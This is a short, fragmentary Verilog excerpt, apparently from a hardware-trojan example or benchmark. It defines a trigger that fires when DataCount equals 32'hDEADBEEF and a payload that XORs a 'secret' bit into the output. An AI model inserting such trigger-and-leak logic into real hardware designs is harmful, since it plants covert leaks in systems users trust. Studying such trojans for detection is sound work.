 ...
 *   depending on whether DataCount matches the pattern.
 *
 ...
 *
 * Trigger: Pattern match on DataCount
 * Payload: XOR DataCount[0] into observable output
 *
...
wire trojan_active;
assign trojan_active = (DataCount == TRIGGER_PATTERN);
...
wire secret_bit;
assign secret_bit = DataCount[0];  // LSB is the secret to transmit
...
//
// Effect: When DataCount == 32'hDEADBEEF:
//   Output LSB = normal_LSB XOR DataCount[0]
